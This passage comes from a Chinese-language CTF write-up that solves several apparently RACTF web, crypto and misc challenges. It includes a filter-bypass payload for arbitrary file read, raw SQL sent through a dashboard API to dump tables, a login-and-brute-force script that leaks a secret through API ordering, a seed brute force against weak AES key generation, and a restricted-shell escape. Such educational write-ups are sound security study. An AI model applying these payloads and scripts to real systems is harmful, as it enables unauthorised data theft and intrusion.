拼接后赋值给了最终返回响应内容的文件名。那么此时即可使用绝对路径进行任意文件读取。但是要达成需要先绕过笔记保存时的如下过滤。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">self, commit=<span class="literal">True</span></span>):</span></span><br><span class="line">    instance = <span class="built_in">super</span>(NoteCreateForm, self).save(commit=<span class="literal">False</span>)</span><br><span class="line">    instance.author = self.user</span><br><span class="line">    instance.body = instance.body.replace(<span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&#125;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;emoji.json&quot;</span>) <span class="keyword">as</span> emoji_file:</span><br><span class="line">        emojis = json.load(emoji_file)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> emoji <span class="keyword">in</span> re.findall(<span class="string">&quot;(:[a-z_]*?:)&quot;</span>, instance.body):</span><br><span class="line">            instance.body = instance.body.replace(emoji, <span class="string">&quot;&#123;&#123;&quot;</span> + emojis[emoji.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)] + <span class="string">&quot;.png&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> commit:</span><br><span class="line">        instance.save()</span><br><span class="line">        self._save_m2m()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> instance</span><br></pre></td></tr></table></figure><p>其将双花括号和两点依次进行空替换处理，构造出如下载荷来达成渲染 emoji 从而达成任意文件读取。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;..&#123;&#x2F;flag.txt&#125;..&#125;</span><br></pre></td></tr></table></figure><p>此时替换后即可正好达成 <code>&#123;&#123;/flag.txt&#125;&#125;</code>，从而在查看页面中渲染出如下包含 flag 的信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:image&#x2F;png;base64,cmFjdGZ7ZGo0bmcwX2xmaX0K</span><br></pre></td></tr></table></figure><p>将字符串中包含的 Base64 字符串解码即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;dj4ng0_lfi&#125;</span><br></pre></td></tr></table></figure><h3 id="Really-Awesome-Hidden-Service"><a href="#Really-Awesome-Hidden-Service" class="headerlink" title="Really Awesome Hidden Service"></a>Really Awesome Hidden Service</h3><p>Tor 打开所给的链接后可以得到如下页面。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629257051164705/8bc89dcda1cc9f449fd31d4c35c7ea0e89fcb763.png"></p><p>因此需要想办法找到隐藏的服务，参照如下页面可以找到思路。</p><blockquote><p><a href="https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/">https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/</a></p></blockquote><p>由于站点使用的 favicon 都是一样的，因此可以使用 favicon 的 MurmurHash3 配合 Shodan 来进行页面搜寻。将页面所用的 favicon 下载下来后使用如下脚本得到 hash。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,mmh3,base64</span><br><span class="line">favicon = base64.encodebytes(<span class="built_in">open</span>(<span class="string">&quot;./favicon.ico&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure><p>使用 Shodan 配合关键词 http.favicon.hash:-915494641 搜索可以得到如下结果。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/a13494bb-6130-4ccf-8ca4-202b501898a0/1629257334439457/21363494246d6938dfc690c67f4352e9ae3b4649.png"></p><p>可以发现得出了两个页面，访问页面即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;DreadingPirates&#125;</span><br></pre></td></tr></table></figure><h3 id="Really-Awesome-Monitoring-Dashboard"><a href="#Really-Awesome-Monitoring-Dashboard" class="headerlink" title="Really Awesome Monitoring Dashboard"></a>Really Awesome Monitoring Dashboard</h3><p>打开站点后查看请求，可以发现有一个 /api/ds/query 的请求中提交了 SQL 语句，且其所使用的数据库类型是 SQLite。按照其请求构造出如下载荷来尝试读取出表结构。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;queries&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;queryText&quot;</span>:<span class="string">&quot;SELECT group_concat(sql) FROM sqlite_master;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;queryType&quot;</span>:<span class="string">&quot;table&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;rawQueryText&quot;</span>:<span class="string">&quot;SELECT group_concat(sql) FROM sqlite_master;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;refId&quot;</span>:<span class="string">&quot;A&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;datasource&quot;</span>:<span class="string">&quot;sqlite&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;datasourceId&quot;</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;intervalMs&quot;</span>:<span class="number">30000</span>,</span><br><span class="line">            <span class="attr">&quot;maxDataPoints&quot;</span>:<span class="number">710</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现响应中确实包含了表的结构，处理之后得到如下表结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &quot;logs&quot; (</span><br><span class="line">&quot;host&quot;TEXT NOT NULL,</span><br><span class="line">&quot;status&quot;TEXT NOT NULL</span><br><span class="line">),CREATE TABLE &quot;flags&quot; (</span><br><span class="line">&quot;challenge&quot;INTEGER NOT NULL,</span><br><span class="line">&quot;flag&quot;TEXT NOT NULL</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>因此进一步构造出如下载荷读取出 flag。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;queries&quot;</span>:[</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;queryText&quot;</span>:<span class="string">&quot;SELECT group_concat(flag) FROM flags;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;queryType&quot;</span>:<span class="string">&quot;table&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;rawQueryText&quot;</span>:<span class="string">&quot;SELECT group_concat(flag) FROM flags;&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;refId&quot;</span>:<span class="string">&quot;A&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;datasource&quot;</span>:<span class="string">&quot;sqlite&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;datasourceId&quot;</span>:<span class="number">1</span>,</span><br><span class="line">            <span class="attr">&quot;intervalMs&quot;</span>:<span class="number">30000</span>,</span><br><span class="line">            <span class="attr">&quot;maxDataPoints&quot;</span>:<span class="number">710</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将包含载荷的请求发送即可在响应中得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;BringBackNagios&#125;</span><br></pre></td></tr></table></figure><h3 id="Secret-Store"><a href="#Secret-Store" class="headerlink" title="Secret Store"></a>Secret Store</h3><blockquote><p>How many secrets could a secret store store if a store could store secrets?</p></blockquote><p>题目给出的源码关键部分如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecretViewSet</span>(<span class="params">viewsets.ModelViewSet</span>):</span></span><br><span class="line">    queryset = Secret.objects.<span class="built_in">all</span>()</span><br><span class="line">    serializer_class = SecretSerializer</span><br><span class="line">    permission_classes = (IsAuthenticated &amp; IsSecretOwnerOrReadOnly,)</span><br><span class="line">    filter_backends = [filters.OrderingFilter]</span><br><span class="line">    ordering_fields = <span class="string">&quot;__all__&quot;</span></span><br></pre></td></tr></table></figure><p>在登录后按照提示访问 /api/secret/ 路由可以提交一个 secret，在尝试之下可以发现 GET 请求这个路由可以得到目前所有存储的 secret 的基本信息。此时再来看这个 ViewSet，注意到他的 ordering_filelds 的值被设定为了 __all__。查阅 Django 的文档可以发现有如下描述。</p><blockquote><p>If you are confident that the queryset being used by the view doesn’t contain any sensitive data, you can also explicitly specify that a view should allow ordering on <em>any</em> model field or queryset aggregate, by using the special value <code>&#39;__all__&#39;</code>.</p></blockquote><p>因此我们可以指定任意的一个键值作为排序的依据，而当我们反复覆写的 value 达到跟 id 为 1 的 secret 的临界值的时候，就可以得出某一位的值。譬如在内容为 rb 的时候，排序应该位于所求 secret 的 ra 的下方，而 ra 的时候则可能有所变化。按照这个规则写出如下脚本来获取 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">session = requests.Client(base_url=<span class="string">&quot;http://193.57.159.27:49687/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fetch CSRF token</span></span><br><span class="line">response = session.get(<span class="string">&quot;/auth/login&quot;</span>)</span><br><span class="line">html = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">csrfToken = html.find_all(<span class="string">&quot;input&quot;</span>)[<span class="number">0</span>][<span class="string">&quot;value&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] found CSRF token <span class="subst">&#123;csrfToken&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Login</span></span><br><span class="line">response = session.post(<span class="string">&quot;/auth/login/&quot;</span>, data=&#123;</span><br><span class="line">    <span class="string">&quot;csrfmiddlewaretoken&quot;</span>: csrfToken,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;atest&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;thisisapassword&quot;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">assert</span> <span class="string">&quot;Hi&quot;</span> <span class="keyword">in</span> response.content.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] login successfully!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bruteforce flag</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">characters = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    signal = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(characters)):</span><br><span class="line">        response = session.post(<span class="string">&quot;/api/secret/&quot;</span>, json=&#123;</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: flag + characters[x]</span><br><span class="line">        &#125;,headers=&#123;</span><br><span class="line">            <span class="string">&quot;X-CSRFToken&quot;</span>: session.cookies[<span class="string">&#x27;csrftoken&#x27;</span>]</span><br><span class="line">        &#125;)</span><br><span class="line">        selfSecretId = json.loads(response.content.decode())[<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line">        response = session.get(<span class="string">&quot;/api/secret/&quot;</span>, params=&#123;</span><br><span class="line">            <span class="string">&quot;ordering&quot;</span>: <span class="string">&quot;value&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        data = json.loads(response.content.decode())</span><br><span class="line">        <span class="keyword">for</span> datum <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> datum[<span class="string">&quot;id&quot;</span>] == selfSecretId:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> datum[<span class="string">&quot;id&quot;</span>] == <span class="number">1</span>:</span><br><span class="line">                signal = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> signal == <span class="literal">True</span>:</span><br><span class="line">            flag += characters[x - <span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运行脚本可以得出 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;data_exf1l_via_s0rt1ng_0c66de47&#125;</span><br></pre></td></tr></table></figure><h3 id="Military-Grade"><a href="#Military-Grade" class="headerlink" title="Military Grade"></a>Military Grade</h3><blockquote><p>Go is safe, right? That means my implementation of AES will be secure?</p></blockquote><p>题目给出的源码如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rawFlag = <span class="string">&quot;[REDACTED]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> flag <span class="keyword">string</span></span><br><span class="line"><span class="keyword">var</span> flagmu sync.Mutex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PKCS5Padding</span><span class="params">(ciphertext []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>, after <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">padding := (blockSize - <span class="built_in">len</span>(ciphertext)%blockSize)</span><br><span class="line">padtext := bytes.Repeat([]<span class="keyword">byte</span>&#123;<span class="keyword">byte</span>(padding)&#125;, padding)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">append</span>(ciphertext, padtext...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">encrypt</span><span class="params">(plaintext <span class="keyword">string</span>, bKey []<span class="keyword">byte</span>, bIV []<span class="keyword">byte</span>, blockSize <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">bPlaintext := PKCS5Padding([]<span class="keyword">byte</span>(plaintext), blockSize, <span class="built_in">len</span>(plaintext))</span><br><span class="line">block, err := aes.NewCipher(bKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(err)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">ciphertext := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(bPlaintext))</span><br><span class="line">mode := cipher.NewCBCEncrypter(block, bIV)</span><br><span class="line">mode.CryptBlocks(ciphertext, bPlaintext)</span><br><span class="line"><span class="keyword">return</span> hex.EncodeToString(ciphertext)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changer</span><span class="params">()</span></span> &#123;</span><br><span class="line">ticker := time.NewTicker(time.Millisecond * <span class="number">672</span>).C</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">range</span> ticker &#123;</span><br><span class="line">rand.Seed(time.Now().UnixNano() &amp; ^<span class="number">0x7FFFFFFFFEFFF000</span>)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; rand.Intn(<span class="number">32</span>); i++ &#123;</span><br><span class="line">rand.Seed(rand.Int63())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key []<span class="keyword">byte</span></span><br><span class="line"><span class="keyword">var</span> iv []<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">32</span>; i++ &#123;</span><br><span class="line">key = <span class="built_in">append</span>(key, <span class="keyword">byte</span>(rand.Intn(<span class="number">255</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; aes.BlockSize; i++ &#123;</span><br><span class="line">iv = <span class="built_in">append</span>(iv, <span class="keyword">byte</span>(rand.Intn(<span class="number">255</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flagmu.Lock()</span><br><span class="line">flag = encrypt(rawFlag, key, iv, aes.BlockSize)</span><br><span class="line">flagmu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handler</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">flagmu.Lock()</span><br><span class="line">fmt.Fprint(w, flag)</span><br><span class="line">flagmu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Challenge starting up&quot;</span>)</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/&quot;</span>, handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> changer()</span><br><span class="line"></span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">&quot;:80&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现是将 flag 使用 AES 加密后输出，访问靶机可以得到一个 flag 的密文。根据其算法可知，由于 0x7FFFFFFFFEFFF000 的处理使得此处可以爆破出 flag。写个脚本来完成爆破。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">aesFlag := <span class="string">&quot;ff322d526ea821a59e7da84a1da772fe6cf99e7e5b02a1fd3ac7776b1cfdb03c&quot;</span></span><br><span class="line"><span class="keyword">for</span> seed := <span class="number">1</span>; seed &lt;= <span class="number">2147483647</span>; seed++ &#123;</span><br><span class="line">rand.Seed(<span class="keyword">int64</span>(seed))</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; rand.Intn(<span class="number">32</span>); i++ &#123;</span><br><span class="line">rand.Seed(rand.Int63())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key []<span class="keyword">byte</span></span><br><span class="line"><span class="keyword">var</span> iv []<span class="keyword">byte</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">32</span>; i++ &#123;</span><br><span class="line">key = <span class="built_in">append</span>(key, <span class="keyword">byte</span>(rand.Intn(<span class="number">255</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; aes.BlockSize; i++ &#123;</span><br><span class="line">iv = <span class="built_in">append</span>(iv, <span class="keyword">byte</span>(rand.Intn(<span class="number">255</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">block, _ := aes.NewCipher(key)</span><br><span class="line">decodedFlag, _ := hex.DecodeString(aesFlag)</span><br><span class="line">mode := cipher.NewCBCDecrypter(block, iv)</span><br><span class="line">bFlag := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(decodedFlag))</span><br><span class="line">mode.CryptBlocks(bFlag, decodedFlag)</span><br><span class="line">flag := <span class="keyword">string</span>(bFlag)</span><br><span class="line"><span class="keyword">if</span> strings.Contains(flag, <span class="string">&quot;ractf&quot;</span>) &#123;</span><br><span class="line">flag := flag[:<span class="built_in">len</span>(flag) - <span class="number">1</span>]</span><br><span class="line">fmt.Printf(flag)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行脚本可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ractf&#123;int3rEst1ng_M4sk_paTt3rn&#125;</span><br></pre></td></tr></table></figure><h2 id="Miscellaneous"><a href="#Miscellaneous" class="headerlink" title="Miscellaneous"></a>Miscellaneous</h2><h3 id="Missing-Tools"><a href="#Missing-Tools" class="headerlink" title="Missing Tools"></a>Missing Tools</h3><blockquote><p>Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?</p></blockquote><p>给出的是一个有诸多限制的 bash，使用 echo * 可以发现在当前的目录下有 flag.txt。作者忽略了 source 这个指令，因此导致了一个非预期，直接 source flag.txt 即可得到如下回显。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source: ractf&#123;std0ut_1s_0v3rr4ted_spl1t_sha&#125;: No such file or directory</span><br></pre></td></tr></table></figure><h4 id="Intended-Solution"><a href="#Intended-Solution" class="headerlink" title="Intended Solution"></a>Intended Solution</h4><p>这题的预期解是使用 split 配合 sha256sum 来将 flag 分割成一个字符一个文件然后得出 hash，再根据字母表做出一个 map，匹配之后得出 flag。执行 split -b 1 flag.txt 和 sha256sum x* 之后可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">454349e422f05297191ead13e21d3db520e5abef52055e4964b82fb213f593a1  xaa</span><br><span class="line">ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb  xab</span><br><span class="line">2e7d2c03a9507ae265ecf5b5356885a53393a2029d241394997265a1a25aefc6  xac</span><br><span 